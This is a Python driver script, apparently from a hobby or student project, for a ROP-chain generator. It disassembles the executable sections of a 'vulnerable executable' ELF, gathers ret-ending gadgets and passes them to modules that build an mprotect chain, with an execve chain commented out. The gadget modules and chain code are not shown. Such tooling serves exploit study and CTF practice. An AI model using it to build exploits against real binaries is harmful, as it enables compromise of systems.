#!/usr/bin/python3

# This is the driver file. 

from capstone import *
from argparse import ArgumentParser
from elftools.elf.elffile import ELFFile

import get_gadgets  
import categorize
import chain
import print_pretty
import general

import execveChain
import mprotectChain


if __name__ == "__main__": 

    parser = ArgumentParser()
    parser.add_argument("-f", "--file", dest="filename",
                        help="vulnerable executable", metavar="FILE")
    parser.add_argument("-l", "--length", dest="length",
                        help="Max number of bytes to traverse above c3", metavar="NUM")

    args = parser.parse_args()

    vulnExecutable = str(args.filename)

    gadgetLength = int(args.length)

    if(vulnExecutable== None):
        print("Use the --flag or -f flag to enter the vulnerable executable!")

    if(gadgetLength == None):
        print("Use the --length or -l flag to enter the max number of bytes to traverse above c3!")

    with open(vulnExecutable, 'rb') as fd:
        elffile = ELFFile(fd)
        print("Searching all executable sections....")
        for section in elffile.iter_sections():
            curr_code = elffile.get_section_by_name(section.name)
            if(curr_code['sh_flags'] & 4): # only if the first bit of sh_flags is set, is the section executable and we can collect gadgets from here
                print("Searching the " + section.name + " section")
                section_name = section.name
                code = elffile.get_section_by_name(section_name)
                opcodes = code.data()
                addr = code['sh_addr'] # section header address
                # print('Entry Point: '+ str(hex(elffile.header['e_entry'])))
                EntryAddress = addr # elffile.header['e_entry']
                md = Cs(CS_ARCH_X86, CS_MODE_64)
                instructions = md.disasm(opcodes,addr)
                ins = md.disasm(opcodes[0], addr)
            
                if instructions == 0:
                    print("Unable to disassemble executable")
                    exit(1)
                
                get_gadgets.GetAllGadgets(instructions, code.data(), EntryAddress, get_gadgets.SpecialInstructions,gadgetLength)

    TwoInstGadgets = categorize.getLNGadgets(get_gadgets.allGadgets, 2)

    general.ALLGADGETS = categorize.categorize(TwoInstGadgets)

    # execveChain.execveROPChain(general.ALLGADGETS, vulnExecutable)

    # As of now, mprotect system call is failing for some reason. Will figure it out.
    mprotectChain.mprotectROPChain(general.ALLGADGETS, vulnExecutable)